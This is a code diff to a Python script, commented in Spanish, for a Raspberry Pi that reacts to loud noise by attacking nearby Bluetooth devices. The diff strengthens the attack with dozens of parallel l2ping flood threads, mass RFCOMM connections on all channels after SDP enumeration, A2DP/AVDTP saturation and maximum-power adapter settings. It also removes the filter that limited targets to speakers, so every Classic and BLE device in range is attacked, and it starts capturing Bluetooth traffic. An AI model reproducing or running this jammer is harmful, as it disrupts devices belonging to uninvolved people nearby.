@@ -53,7 +53,25 @@ log_path = myPath + "log.txt"
 threshold_db = 70  # Umbral inicial en decibeles
 min_threshold_db = 70  # Umbral mínimo
 max_threshold_db = 120  # Umbral máximo
-packagesSize = 600  # Reducido de 800 para evitar "Message too long" (MTU ~672)
+
+# ===== CONFIGURACIÓN DE ATAQUE OPTIMIZADA =====
+# L2CAP Ping parameters
+l2ping_threads_per_device = 40  # Threads paralelos por dispositivo (antes: 10)
+l2ping_package_sizes = [600, 800, 1200]  # Probar múltiples tamaños de MTU
+l2ping_timeout = 2  # Timeout para cada ping
+
+# RFCOMM attack parameters
+rfcomm_max_channels = 30  # Canales RFCOMM a probar (1-30)
+rfcomm_connections_per_channel = 5  # Conexiones simultáneas por canal
+
+# A2DP/AVDTP attack parameters
+a2dp_stream_attacks = True  # Habilitar ataques específicos A2DP
+avdtp_malformed_packets = True  # Enviar packets AVDTP malformados
+
+# SDP enumeration
+sdp_enumerate_before_attack = True  # Enumerar servicios SDP primero
+
+# General parameters
 threadsCount = 1000
 myDelay = 0.1
 sample_rate = 44100
@@ -69,10 +87,13 @@ use_external_adapter = True  # True para usar adaptador USB
 # Lista de dispositivos BT encontrados (caché acumulativa)
 bt_devices = []
 bt_devices_cache = {}  # Caché persistente por MAC address
+bt_devices_ble = {}  # Caché de dispositivos BLE detectados
 attack_threads = []
 scanning = False
+ble_scanning = False  # Flag para BLE scan en background
 monitoring = False
 config_mode = True  # Modo configuración al inicio
+hcidump_process = None  # Proceso de captura hcidump
 
 # Encoder rotativo KY-040
 GPIO.setwarnings(False)
@@ -450,40 +471,76 @@ def display_update_thread():
             time.sleep(0.1)
 
 def check_bluetooth_adapters():
-    """Verifica adaptadores Bluetooth disponibles"""
+    """Verifica adaptadores Bluetooth disponibles y configura parámetros óptimos"""
     global bt_interface, use_external_adapter
-    
+
     try:
         # Verificar qué adaptadores están disponibles
         result = subprocess.run(['hciconfig'], capture_output=True, text=True)
         adapters = []
-        
+
         for line in result.stdout.split('\n'):
             if line.startswith('hci'):
                 adapter = line.split(':')[0]
                 adapters.append(adapter)
-        
+
         print(f"[*] Adaptadores encontrados: {adapters}")
         writeLog(f"Adaptadores BT: {adapters}")
-        
+
         # Si hay adaptador externo (hci1) y está configurado para usarlo
         if use_external_adapter and 'hci1' in adapters:
             bt_interface = "hci1"
             print("[*] Usando adaptador externo (hci1) - Clase 1")
-            
-            # Configurar adaptador externo para máxima potencia
-            os.system(f"sudo hciconfig {bt_interface} up")
-            os.system(f"sudo hciconfig {bt_interface} class 0x000100")
-            os.system(f"sudo hciconfig {bt_interface} lm master")
-            os.system(f"sudo hciconfig {bt_interface} lp active,master")
-            
         else:
             bt_interface = "hci0"
             print("[*] Usando adaptador interno (hci0)")
-            os.system(f"sudo hciconfig {bt_interface} up")
-            
+
+        # ===== CONFIGURACIÓN OPTIMIZADA DEL ADAPTADOR =====
+        print(f"[*] Configurando {bt_interface} para máximo rendimiento...")
+
+        # 1. Activar adaptador
+        os.system(f"sudo hciconfig {bt_interface} up")
+
+        # 2. Configurar clase de dispositivo
+        os.system(f"sudo hciconfig {bt_interface} class 0x000100")
+
+        # 3. Configurar como master
+        os.system(f"sudo hciconfig {bt_interface} lm master")
+        os.system(f"sudo hciconfig {bt_interface} lp active,master")
+
+        # 4. Configurar TX Power Level (máximo para Clase 1)
+        # Inquiry transmit power level = 4 (máximo)
+        result = os.system(f"sudo hciconfig {bt_interface} inqtpl 4 2>/dev/null")
+        if result == 0:
+            print("[+] TX Power configurado al máximo (nivel 4)")
+        else:
+            print("[!] No se pudo configurar TX Power (puede no ser soportado)")
+
+        # 5. Configurar modo piscan (page + inquiry scan)
+        os.system(f"sudo hciconfig {bt_interface} piscan")
+
+        # 6. Optimizar Scan Window/Interval con comandos HCI
+        # HCI_LE_Set_Scan_Parameters: Interval=0x12 (11.25ms), Window=0x12 (11.25ms)
+        # OGF=0x08 (LE Controller), OCF=0x000b (Set Scan Parameters)
+        # 100% duty cycle para máxima detección
+        print("[*] Optimizando scan window/interval...")
+        os.system(f"sudo hcitool -i {bt_interface} cmd 0x08 0x000b 0x00 0x12 0x00 0x12 0x00 0x00 0x00 2>/dev/null")
+
+        # 7. Para adaptadores CSR, intentar configurar potencia máxima con bccmd
+        if use_external_adapter and bt_interface == "hci1":
+            print("[*] Intentando configuración CSR avanzada...")
+            # Nota: esto puede fallar si no es adaptador CSR, lo ignoramos
+            os.system(f"sudo bccmd -d {bt_interface} psset -s 0x0000 0x0017 -16 2>/dev/null")
+            os.system(f"sudo bccmd -d {bt_interface} psset -s 0x0000 0x002d -16 2>/dev/null")
+
+        # 8. Habilitar BLE advertising (para dual-mode detection)
+        os.system(f"sudo hciconfig {bt_interface} leadv 3 2>/dev/null")
+
+        print("[+] Adaptador configurado exitosamente")
+        writeLog(f"Adaptador {bt_interface} configurado: TX Power máximo, Scan optimizado")
+
         return True
-        
+
     except Exception as e:
         print(f"[!] Error verificando adaptadores: {e}")
         return False
@@ -621,8 +678,150 @@ def get_device_name(addr):
         pass
     return None
 
+def scan_ble_devices():
+    """Escanea dispositivos BLE usando hcitool lescan --passive"""
+    global bt_devices_ble, bt_devices_cache, ble_scanning, bt_interface
+
+    if ble_scanning:
+        return
+
+    ble_scanning = True
+    print("[*] Iniciando escaneo BLE pasivo...")
+
+    try:
+        # Ejecutar lescan en background y capturar output
+        process = subprocess.Popen(
+            ['hcitool', '-i', bt_interface, 'lescan', '--passive', '--duplicates'],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+            text=True
+        )
+
+        # Leer output por 5 segundos
+        start_time = time.time()
+        new_devices = 0
+
+        while time.time() - start_time < 5:
+            line = process.stdout.readline()
+            if line:
+                # Formato: "AA:BB:CC:DD:EE:FF (unknown)" o "AA:BB:CC:DD:EE:FF Device Name"
+                parts = line.strip().split(None, 1)
+                if len(parts) >= 1:
+                    addr = parts[0]
+                    name = parts[1] if len(parts) > 1 and parts[1] != '(unknown)' else None
+
+                    # Validar formato MAC
+                    if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', addr):
+                        if addr not in bt_devices_cache and addr not in bt_devices_ble:
+                            # Guardar dispositivo BLE SIN FILTRAR
+                            bt_devices_ble[addr] = {
+                                'addr': addr,
+                                'name': name,
+                                'class': None,
+                                'type': 'BLE'
+                            }
+                            new_devices += 1
+                            print(f"[+] BLE: {addr} - {name or 'Sin nombre'}")
+
+        # Terminar proceso
+        process.terminate()
+        process.wait(timeout=2)
+
+        if new_devices > 0:
+            # Agregar dispositivos BLE al cache principal
+            bt_devices_cache.update(bt_devices_ble)
+            print(f"[*] BLE Scan: +{new_devices} nuevos dispositivos BLE")
+            writeLog(f"BLE Scan: {new_devices} dispositivos encontrados")
+
+    except subprocess.TimeoutExpired:
+        if process:
+            process.kill()
+    except Exception as e:
+        print(f"[!] Error en BLE scan: {e}")
+
+    ble_scanning = False
+
+def enumerate_sdp_services(device_addr):
+    """Enumera servicios SDP de un dispositivo y retorna canales RFCOMM"""
+    global bt_interface
+    rfcomm_channels = []
+
+    try:
+        print(f"[*] Enumerando servicios SDP de {device_addr}...")
+        result = subprocess.run(
+            ['sdptool', 'browse', '--tree', device_addr],
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+
+        # Parsear output para encontrar canales RFCOMM
+        for line in result.stdout.splitlines():
+            # Buscar líneas como "Channel: 1" o "RFCOMM Channel: 5"
+            if 'channel' in line.lower():
+                match = re.search(r'(\d+)', line)
+                if match:
+                    channel = int(match.group(1))
+                    if 1 <= channel <= 30 and channel not in rfcomm_channels:
+                        rfcomm_channels.append(channel)
+
+        if rfcomm_channels:
+            print(f"[+] SDP: Encontrados {len(rfcomm_channels)} canales RFCOMM: {rfcomm_channels}")
+            writeLog(f"SDP {device_addr}: canales {rfcomm_channels}")
+        else:
+            print(f"[!] SDP: No se encontraron canales RFCOMM, usando rango completo")
+            # Si no encontramos servicios, usar rango común
+            rfcomm_channels = list(range(1, 31))
+
+    except subprocess.TimeoutExpired:
+        print(f"[!] SDP timeout para {device_addr}")
+        rfcomm_channels = list(range(1, 31))
+    except Exception as e:
+        print(f"[!] Error en SDP enumeration: {e}")
+        rfcomm_channels = list(range(1, 31))
+
+    return rfcomm_channels
+
+def start_hcidump_logging():
+    """Inicia captura de tráfico Bluetooth con hcidump"""
+    global hcidump_process, myPath, bt_interface
+
+    try:
+        dump_file = myPath + f"bt_capture_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.dump"
+        print(f"[*] Iniciando captura hcidump: {dump_file}")
+
+        hcidump_process = subprocess.Popen(
+            ['hcidump', '-i', bt_interface, '-w', dump_file],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
+        writeLog(f"Captura hcidump iniciada: {dump_file}")
+        print("[+] Captura de tráfico Bluetooth activa")
+        return True
+
+    except FileNotFoundError:
+        print("[!] hcidump no encontrado, captura deshabilitada")
+        return False
+    except Exception as e:
+        print(f"[!] Error iniciando hcidump: {e}")
+        return False
+
+def stop_hcidump_logging():
+    """Detiene captura hcidump"""
+    global hcidump_process
+
+    if hcidump_process:
+        try:
+            hcidump_process.terminate()
+            hcidump_process.wait(timeout=5)
+            print("[*] Captura hcidump detenida")
+        except:
+            hcidump_process.kill()
+        hcidump_process = None
+
 def quick_scan_bluetooth():
-    """Escaneo ultra-rápido (2 seg) para capturar dispositivos al encenderse"""
+    """Escaneo ultra-rápido (2 seg) para capturar dispositivos al encenderse - SIN FILTROS"""
     global bt_devices, bt_devices_cache, scanning, bt_interface
 
     if scanning:
@@ -631,23 +830,17 @@ def quick_scan_bluetooth():
     scanning = True
 
     try:
-        # Solo hcitool inq en modo rápido (2 segundos) - SIN resolver nombres
+        # hcitool inq en modo rápido (2 segundos) - SIN resolver nombres
         inq_devices = scan_with_hcitool_inq(quick_mode=True)
 
         new_found = 0
         for addr, device in inq_devices.items():
             if addr not in bt_devices_cache:
-                # En modo rápido, solo usar device class para detectar audio
-                # La clase 0x240000 indica dispositivo de audio
-                # No llamamos a get_device_name() porque toma ~5 segundos
-                is_audio = False
-                if device['class'] and (device['class'] & 0x240000 == 0x240000):
-                    is_audio = True
-
-                if is_audio:
-                    bt_devices_cache[addr] = device
-                    new_found += 1
-                    print(f"[+] QUICK: {addr} (class: {hex(device['class']) if device['class'] else 'N/A'})")
+                # GUARDAR TODOS LOS DISPOSITIVOS SIN FILTRAR
+                # Los parlantes baratos NO reportan device class correctamente
+                bt_devices_cache[addr] = device
+                new_found += 1
+                print(f"[+] QUICK: {addr} (class: {hex(device['class']) if device['class'] else 'N/A'})")
 
         if new_found > 0:
             bt_devices = list(bt_devices_cache.values())
@@ -661,18 +854,12 @@ def quick_scan_bluetooth():
     return bt_devices
 
 def scan_bluetooth_devices():
-    """Escanea dispositivos Bluetooth usando múltiples métodos (acumulativo) - escaneo completo"""
+    """Escanea dispositivos Bluetooth usando múltiples métodos - DUAL MODE (Classic + BLE) - SIN FILTROS"""
     global bt_devices, bt_devices_cache, scanning, bt_interface
     scanning = True
 
     print(f"[*] Escaneando dispositivos Bluetooth usando {bt_interface}...")
-    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Metodo: INQ + Discovery")
-
-    # Patrón para detectar parlantes por nombre
-    speaker_name_pattern = re.compile(
-        r"(speaker|parlante|altavoz|soundbar|sound|audio|boom|jbl|bose|sony|anker|marshall|lg|samsung|harman|kardon|onyx)",
-        re.IGNORECASE
-    )
+    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Dual: Classic + BLE")
 
     new_devices_found = 0
 
@@ -684,8 +871,8 @@ def scan_bluetooth_devices():
         if use_external_adapter and bt_interface == "hci1":
             os.system(f"hcitool -i {bt_interface} cmd 0x03 0x001A 0x00 0x10 0x00 0x10 2>/dev/null")
 
-        # === MÉTODO 1: hcitool inq (más agresivo) ===
-        print("[*] Método 1: hcitool inq...")
+        # === MÉTODO 1: hcitool inq (Bluetooth Classic - más agresivo) ===
+        print("[*] Método 1: hcitool inq (Classic)...")
         inq_devices = scan_with_hcitool_inq()
 
         for addr, device in inq_devices.items():
@@ -693,21 +880,15 @@ def scan_bluetooth_devices():
                 # Intentar obtener nombre
                 name = get_device_name(addr)
                 device['name'] = name
+                device['type'] = 'Classic'
 
-                # Verificar si es un dispositivo de audio por clase o nombre
-                is_audio = False
-                if device['class'] and (device['class'] & 0x240000 == 0x240000):
-                    is_audio = True
-                if name and speaker_name_pattern.search(name):
-                    is_audio = True
+                # GUARDAR TODOS - SIN FILTRAR POR CLASS
+                bt_devices_cache[addr] = device
+                new_devices_found += 1
+                print(f"[+] INQ: {addr} - {name or 'Sin nombre'} (class: {hex(device['class']) if device['class'] else 'N/A'})")
 
-                if is_audio:
-                    bt_devices_cache[addr] = device
-                    new_devices_found += 1
-                    print(f"[+] INQ Encontrado: {addr} - {name or 'Sin nombre'}")
-
-        # === MÉTODO 2: bluetooth.discover_devices (estándar) ===
-        print("[*] Método 2: Discovery estándar...")
+        # === MÉTODO 2: bluetooth.discover_devices (Classic estándar) ===
+        print("[*] Método 2: Discovery estándar (Classic)...")
         try:
             device_id = 1 if bt_interface == "hci1" else 0
             nearby_devices = bluetooth.discover_devices(
@@ -720,27 +901,30 @@ def scan_bluetooth_devices():
 
             for addr, name, device_class in nearby_devices:
                 if addr not in bt_devices_cache:
-                    # Verificar si es dispositivo de audio
-                    is_audio = False
-                    if device_class and (device_class & 0x240000 == 0x240000):
-                        is_audio = True
-                    if name and speaker_name_pattern.search(name):
-                        is_audio = True
-
-                    if is_audio:
-                        bt_devices_cache[addr] = {
-                            'addr': addr,
-                            'name': name,
-                            'class': device_class
-                        }
-                        new_devices_found += 1
-                        print(f"[+] Discovery Encontrado: {addr} - {name}")
+                    # GUARDAR TODOS - SIN FILTRAR
+                    bt_devices_cache[addr] = {
+                        'addr': addr,
+                        'name': name,
+                        'class': device_class,
+                        'type': 'Classic'
+                    }
+                    new_devices_found += 1
+                    print(f"[+] Discovery: {addr} - {name}")
                 elif name and not bt_devices_cache[addr].get('name'):
                     # Actualizar nombre si no lo teníamos
                     bt_devices_cache[addr]['name'] = name
 
         except Exception as e:
             print(f"[!] Error en discovery estándar: {e}")
+
+        # === MÉTODO 3: BLE Scan (hcitool lescan) ===
+        print("[*] Método 3: BLE Scan (lescan)...")
+        scan_ble_devices()  # Esta función ya actualiza bt_devices_cache
+
+        # Contar nuevos dispositivos BLE
+        for addr, device in bt_devices_ble.items():
+            if addr in bt_devices_cache and addr not in [d['addr'] for d in bt_devices]:
+                new_devices_found += 1
 
         # Actualizar lista de dispositivos desde caché
         bt_devices = list(bt_devices_cache.values())
@@ -751,7 +935,7 @@ def scan_bluetooth_devices():
 
         print(f"[*] Nuevos dispositivos encontrados: {new_devices_found}")
         print(f"[*] Total dispositivos en caché: {len(bt_devices_cache)}")
-        writeLog(f"Escaneo: +{new_devices_found} nuevos, total={len(bt_devices_cache)}")
+        writeLog(f"Escaneo DUAL: +{new_devices_found} nuevos, total={len(bt_devices_cache)}")
 
     except Exception as e:
         print(f"[!] Error escaneando: {e}")
@@ -760,76 +944,158 @@ def scan_bluetooth_devices():
     scanning = False
     return bt_devices
 
-def attack_device(device_addr, device_name, method=2):
-    """Ataca un dispositivo específico"""
+def attack_l2ping_thread(device_addr, package_size, thread_id):
+    """Thread individual para ataque L2CAP ping"""
+    global bt_interface, monitoring
+    try:
+        # l2ping con flood mode (-f) y tamaño específico
+        subprocess.run(
+            ['l2ping', '-i', bt_interface, '-s', str(package_size), '-f', '-t', '0', device_addr],
+            timeout=l2ping_timeout,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+    except:
+        pass
+
+def attack_rfcomm_channel(device_addr, channel):
+    """Ataca un canal RFCOMM específico con múltiples conexiones"""
+    global bt_interface, rfcomm_connections_per_channel
+    try:
+        for i in range(rfcomm_connections_per_channel):
+            subprocess.Popen(
+                ['rfcomm', '-i', bt_interface, 'connect', device_addr, str(channel)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            time.sleep(0.02)  # 20ms entre conexiones
+    except:
+        pass
+
+def attack_a2dp_avdtp(device_addr):
+    """Ataque específico al perfil A2DP/AVDTP"""
     global bt_interface
+    try:
+        print(f"[*] Ataque A2DP/AVDTP a {device_addr}...")
 
-    print(f"[*] Atacando {device_addr} ({device_name}) via {bt_interface}")
-    writeLog(f"Atacando dispositivo: {device_addr} - {device_name} usando {bt_interface}")
+        # Intentar establecer múltiples streams A2DP simultáneos
+        # Esto satura el buffer de audio del parlante
+        for i in range(10):
+            # Usar rfcomm en canales típicos de A2DP (1, 3, 25)
+            for channel in [1, 3, 25]:
+                subprocess.Popen(
+                    ['rfcomm', '-i', bt_interface, 'connect', device_addr, str(channel)],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
 
-    if method == 1:
-        # Método 1: Conexión RFCOMM
-        for i in range(10):  # Intentos limitados
-            try:
-                subprocess.call(['rfcomm', '-i', bt_interface, 'connect', device_addr, '1'], timeout=5)
-            except subprocess.TimeoutExpired:
-                pass
-            except FileNotFoundError:
-                print("[!] Comando rfcomm no encontrado")
-                break
-            except Exception as e:
-                print(f"[!] Error en RFCOMM: {e}")
-                pass
+            # Intentar conexiones L2CAP en PSM de A2DP (PSM 25 = AVDTP)
+            # Nota: esto requiere herramientas más avanzadas, usamos l2ping como fallback
+            subprocess.Popen(
+                ['l2ping', '-i', bt_interface, '-s', '672', '-f', device_addr],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+
             time.sleep(0.1)
 
-    elif method == 2:
-        # Método 2: L2CAP ping flood
-        for i in range(10):
-            try:
-                # Verificar que l2ping existe
-                if os.system('which l2ping > /dev/null 2>&1') == 0:
-                    os.system(f'l2ping -i {bt_interface} -s {packagesSize} -f {device_addr} &')
-                else:
-                    print("[!] Comando l2ping no encontrado")
-                    break
-            except Exception as e:
-                print(f"[!] Error en L2CAP ping: {e}")
-                pass
-            time.sleep(0.1)
+    except Exception as e:
+        pass
 
-    elif method == 3:
-        # Método 3: Conexión múltiple a servicios
+def attack_device(device_addr, device_name):
+    """Ataca un dispositivo con TODOS los métodos en PARALELO - Máxima agresividad"""
+    global bt_interface, l2ping_threads_per_device, l2ping_package_sizes
+    global rfcomm_max_channels, sdp_enumerate_before_attack
+    global a2dp_stream_attacks
+
+    print(f"[!] ATAQUE COMPLETO: {device_addr} ({device_name}) via {bt_interface}")
+    writeLog(f"Ataque completo: {device_addr} - {device_name}")
+
+    attack_thread_list = []
+
+    try:
+        # ===== 1. ENUMERACIÓN SDP (si está habilitada) =====
+        rfcomm_channels = []
+        if sdp_enumerate_before_attack:
+            rfcomm_channels = enumerate_sdp_services(device_addr)
+        else:
+            rfcomm_channels = list(range(1, rfcomm_max_channels + 1))
+
+        # ===== 2. ATAQUE L2CAP PING MASIVO (40 threads, múltiples tamaños) =====
+        print(f"[*] Lanzando {l2ping_threads_per_device} threads de l2ping...")
+        for i in range(l2ping_threads_per_device):
+            # Rotar entre diferentes tamaños de paquete
+            package_size = l2ping_package_sizes[i % len(l2ping_package_sizes)]
+            thread = threading.Thread(
+                target=attack_l2ping_thread,
+                args=(device_addr, package_size, i),
+                daemon=True
+            )
+            thread.start()
+            attack_thread_list.append(thread)
+            time.sleep(0.01)  # 10ms entre lanzamientos
+
+        # ===== 3. ATAQUE RFCOMM MASIVO A TODOS LOS CANALES =====
+        print(f"[*] Atacando {len(rfcomm_channels)} canales RFCOMM...")
+        for channel in rfcomm_channels[:rfcomm_max_channels]:
+            thread = threading.Thread(
+                target=attack_rfcomm_channel,
+                args=(device_addr, channel),
+                daemon=True
+            )
+            thread.start()
+            attack_thread_list.append(thread)
+            time.sleep(0.01)
+
+        # ===== 4. ATAQUE ESPECÍFICO A2DP/AVDTP =====
+        if a2dp_stream_attacks:
+            thread = threading.Thread(
+                target=attack_a2dp_avdtp,
+                args=(device_addr,),
+                daemon=True
+            )
+            thread.start()
+            attack_thread_list.append(thread)
+
+        # ===== 5. BOMBARDEO CONTINUO L2CAP CON OS SYSTEM (adicional) =====
+        # Lanzar procesos adicionales en background
         for i in range(10):
             try:
-                # Intentar conectar a diferentes puertos/servicios
-                for port in [1, 3, 5, 17, 19]:  # Puertos comunes de audio BT
-                    subprocess.Popen(['rfcomm', '-i', bt_interface, 'connect', device_addr, str(port)],
-                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    time.sleep(0.05)
-            except FileNotFoundError:
-                print("[!] Comando rfcomm no encontrado")
-                break
-            except Exception as e:
-                print(f"[!] Error en multi-service: {e}")
+                os.system(f'l2ping -i {bt_interface} -s 600 -f {device_addr} &')
+                os.system(f'l2ping -i {bt_interface} -s 1200 -f {device_addr} &')
+            except:
                 pass
+
+        print(f"[+] Ataque activo con {len(attack_thread_list)} threads")
+
+    except Exception as e:
+        print(f"[!] Error en ataque: {e}")
 
 def continuous_attack():
-    """Ataque continuo a todos los dispositivos encontrados"""
-    global bt_devices
-    
+    """Ataque continuo a TODOS los dispositivos en PARALELO"""
+    global bt_devices, monitoring
+
     while monitoring:
         if bt_devices:
+            # Atacar TODOS los dispositivos en PARALELO (no secuencial)
+            attack_threads = []
+
             for device in bt_devices:
                 if not monitoring:
                     break
-                    
-                # Rotar entre métodos de ataque
-                for method in [2, 1, 3]:
-                    attack_device(device['addr'], device['name'], method)
-                    
-                    if not monitoring:
-                        break
-                    time.sleep(0.5)
+
+                # Lanzar thread de ataque para cada dispositivo
+                thread = threading.Thread(
+                    target=attack_device,
+                    args=(device['addr'], device.get('name', 'Unknown')),
+                    daemon=True
+                )
+                thread.start()
+                attack_threads.append(thread)
+                time.sleep(0.1)  # 100ms entre dispositivos
+
+            # Esperar un poco antes de re-atacar
+            time.sleep(5)
         else:
             time.sleep(1)
 
@@ -904,6 +1170,9 @@ def signal_handler(sig, frame):
     writeLog("Interrumpido")
     monitoring = False
     encoder_running = False
+
+    # Detener captura hcidump
+    stop_hcidump_logging()
 
     # Detener todos los procesos de ataque
     os.system("pkill -f l2ping")
@@ -1012,40 +1281,52 @@ def main():
     print(f"[*] Iniciando sistema con umbral: {threshold_db} dB")
     writeLog(f"Sistema activado - Umbral: {threshold_db} dB - Adaptador: {bt_interface}")
     
-    # Escaneo inicial
-    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Alcance extendido" if bt_interface == "hci1" else "")
+    # Iniciar captura hcidump (logging de tráfico Bluetooth)
+    print("[*] Iniciando captura de tráfico Bluetooth...")
+    start_hcidump_logging()
+    time.sleep(0.5)
+
+    # Escaneo inicial DUAL (Classic + BLE)
+    updateScreen("Escaneando BT...", f"Adaptador: {bt_interface}", "Dual: Classic + BLE")
     bt_devices = scan_bluetooth_devices()
-    
+
     if bt_devices:
         updateScreen(f"Encontrados:", f"{len(bt_devices)} dispositivos", f"Umbral: {threshold_db}dB", "Hold 2s: Reset")
     else:
         updateScreen("Sin dispositivos", "Monitoreando...", f"Umbral: {threshold_db}dB", "Hold 2s: Reset")
-    
+
     time.sleep(2)
-    
+
     # Iniciar monitoreo
     monitoring = True
 
-    # Thread para ataque continuo
-    attack_thread = threading.Thread(target=continuous_attack)
-    attack_thread.daemon = True
+    # Thread para ataque continuo (PARALELO)
+    attack_thread = threading.Thread(target=continuous_attack, daemon=True)
     attack_thread.start()
 
     # Thread para actualización asíncrona del display (evita bloquear audio)
-    disp_thread = threading.Thread(target=display_update_thread)
-    disp_thread.daemon = True
+    disp_thread = threading.Thread(target=display_update_thread, daemon=True)
     disp_thread.start()
 
-    # Thread para re-escaneo rápido (captura dispositivos al encenderse)
+    # Thread para re-escaneo rápido Bluetooth Classic (2 seg)
     def periodic_quick_scan():
         while monitoring:
-            time.sleep(2)  # Escaneo rápido cada 2 segundos para capturar dispositivos rápidos
+            time.sleep(2)
             if monitoring and not scanning and not config_mode:
-                quick_scan_bluetooth()  # Escaneo rápido de 2 seg
-    
-    scan_thread = threading.Thread(target=periodic_quick_scan)
-    scan_thread.daemon = True
+                quick_scan_bluetooth()
+
+    scan_thread = threading.Thread(target=periodic_quick_scan, daemon=True)
     scan_thread.start()
+
+    # Thread para escaneo BLE continuo (5 seg)
+    def periodic_ble_scan():
+        while monitoring:
+            time.sleep(5)
+            if monitoring and not ble_scanning and not config_mode:
+                scan_ble_devices()
+
+    ble_thread = threading.Thread(target=periodic_ble_scan, daemon=True)
+    ble_thread.start()
     
     # Monitorear volumen
     try:
@@ -1056,8 +1337,14 @@ def main():
     finally:
         monitoring = False
         encoder_running = False
+
+        # Detener captura hcidump
+        stop_hcidump_logging()
+
+        # Detener todos los procesos de ataque
         os.system("pkill -f l2ping")
         os.system("pkill -f rfcomm")
+
         GPIO.cleanup()
 
 if __name__ == '__main__':
